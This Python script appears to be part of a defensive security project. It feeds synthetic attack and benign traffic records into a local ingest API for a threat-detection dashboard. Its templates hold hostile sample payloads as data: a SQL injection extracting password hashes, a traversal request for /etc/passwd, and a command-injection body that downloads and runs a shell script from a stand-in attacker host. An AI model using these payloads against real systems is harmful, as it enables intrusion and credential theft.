"""
backend/attack_simulator.py

CHIMERA Live Attack Traffic Simulator
Continuously feeds realistic threat vectors, decoy triggers, and benign traffic
with local timestamps into the FastAPI ingest pipeline at 1.5-second intervals.
"""

import time
import random
import sys
from datetime import datetime
import requests

TARGET_URL = "http://127.0.0.1:8000/api/ingest"

# ANSI Color Codes for terminal formatting
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

# 6 diverse attacker and user source IPs
IP_POOL = [
    "185.220.101.42",
    "89.248.165.74",
    "45.155.205.88",
    "194.26.29.112",
    "103.203.57.18",
    "192.168.1.105",
]

# Realistic traffic payload mixture
ATTACK_TEMPLATES = [
    {
        "name": "SQLi Exploit (CVE-2024-SQLi-Extraction)",
        "endpoint": "/api/v1/users?id=1",
        "method": "GET",
        "headers": {"user-agent": "sqlmap/1.7.2#stable"},
        "body": "id=1' UNION SELECT null, username, password_hash FROM users--",
        "anomaly_score": 0.94,
        "attack_type": "SQL Injection (UNION-based Extraction)",
    },
    {
        "name": "SSH / Auth Credential Stuffing",
        "endpoint": "/api/v1/auth/login",
        "method": "POST",
        "headers": {"user-agent": "python-requests/2.31.0", "content-type": "application/json"},
        "body": '{"username": "admin", "password": "Password123!"}',
        "anomaly_score": 0.88,
        "attack_type": "Credential Stuffing Campaign",
    },
    {
        "name": "Decoy Honeypot Trap (/decoy/db-admin)",
        "endpoint": "/decoy/db-admin",
        "method": "POST",
        "headers": {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        "body": "SELECT * FROM chimera_admin_credentials;",
        "anomaly_score": 0.96,
        "attack_type": "Honeypot Trap Interaction",
    },
    {
        "name": "PAN-OS RCE Exploit (CVE-2024-3400)",
        "endpoint": "/ssl-vpn/hipreport.esp",
        "method": "POST",
        "headers": {"user-agent": "curl/8.5.0"},
        "body": "COOKIE: `curl http://c2.malicious.net/shell.sh | sh`",
        "anomaly_score": 0.99,
        "attack_type": "PAN-OS Command Injection (CVE-2024-3400)",
    },
    {
        "name": "Directory Traversal / LFI (/etc/passwd)",
        "endpoint": "/api/v1/files?path=../../../../../../etc/passwd",
        "method": "GET",
        "headers": {"user-agent": "curl/8.5.0"},
        "body": "",
        "anomaly_score": 0.91,
        "attack_type": "Directory Traversal / LFI",
    },
    {
        "name": "Benign Telemetry (API Metrics Ping)",
        "endpoint": "/metrics",
        "method": "GET",
        "headers": {"user-agent": "Prometheus/2.45.0"},
        "body": "",
        "anomaly_score": 0.08,
        "attack_type": "Normal Metrics Polling",
    },
    {
        "name": "Benign User Traffic (Product Search)",
        "endpoint": "/api/v1/products?category=electronics",
        "method": "GET",
        "headers": {"user-agent": "Mozilla/5.0 Chrome/124.0.0.0"},
        "body": "",
        "anomaly_score": 0.12,
        "attack_type": "Benign User Query",
    },
]


def run_simulator():
    print(f"\n{BOLD}{'=' * 80}{RESET}")
    print(f"{BOLD}{CYAN}  🔥 CHIMERA CONTINUOUS ATTACK SIMULATOR & TELEMETRY INJECTOR 🔥{RESET}")
    print(f"{DIM}  Target Endpoint : {TARGET_URL}{RESET}")
    print(f"{DIM}  Interval        : 1.5 seconds (Local Time Timestamps){RESET}")
    print(f"{BOLD}{'=' * 80}{RESET}\n")

    counter = 0

    while True:
        counter += 1
        template = random.choice(ATTACK_TEMPLATES)
        source_ip = random.choice(IP_POOL)
        local_time_str = datetime.now().strftime("%H:%M:%S")

        payload = {
            "source_ip": source_ip,
            "destination_ip": "10.0.0.5",
            "endpoint": template["endpoint"],
            "method": template["method"],
            "headers": template["headers"],
            "body": template["body"],
            "timestamp": local_time_str,
            "anomaly_score": template["anomaly_score"],
            "attack_type": template["attack_type"],
        }

        attack_name = template["name"]
        endpoint = template["endpoint"]

        try:
            response = requests.post(TARGET_URL, json=payload, timeout=4)
            status_code = response.status_code

            if status_code == 200:
                data = response.json()
                action = str(data.get("action", "unknown")).upper()
                risk_score = float(data.get("risk_score", template["anomaly_score"]))
                event_id = str(data.get("event_id", ""))[:8]

                if action in ("ESCALATED", "APPROVAL_REQ", "DECEPTION_ACTIVE"):
                    tag_color = RED if action != "DECEPTION_ACTIVE" else YELLOW
                    icon = "🚨 [APPROVAL_REQ]" if action == "APPROVAL_REQ" else ("⚡ [DECOY_TRAP] " if action == "DECEPTION_ACTIVE" else "🔥 [ESCALATED]  ")
                elif action == "AUTO_CONTAINED":
                    tag_color = CYAN
                    icon = "🛡️  [AUTONOMOUS]  "
                else:
                    tag_color = GREEN
                    icon = "✅ [BENIGN/DROP] "

                print(
                    f"[{local_time_str}] #{counter:03d} "
                    f"{tag_color}{icon:<18}{RESET} "
                    f"HTTP {GREEN}{status_code}{RESET} | "
                    f"{BOLD}{endpoint:<30}{RESET} | "
                    f"IP: {CYAN}{source_ip:<15}{RESET} | "
                    f"Score: {tag_color}{risk_score:.2f}{RESET} | "
                    f"{DIM}{attack_name}{RESET} ({event_id}...)"
                )
            else:
                print(
                    f"[{local_time_str}] #{counter:03d} "
                    f"{RED}[HTTP {status_code}]{RESET} "
                    f"Target {endpoint} responded with: {response.text[:60]}"
                )

        except requests.exceptions.ConnectionError:
            print(
                f"[{local_time_str}] #{counter:03d} "
                f"{RED}[CONN_ERROR]{RESET} Cannot connect to {TARGET_URL}. Is FastAPI running on port 8000?"
            )
        except Exception as exc:
            print(
                f"[{local_time_str}] #{counter:03d} "
                f"{RED}[ERROR]{RESET} {exc}"
            )

        time.sleep(1.5)


if __name__ == "__main__":
    try:
        run_simulator()
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[SIMULATOR] Simulator stopped by user. Goodbye!{RESET}\n")
        sys.exit(0)
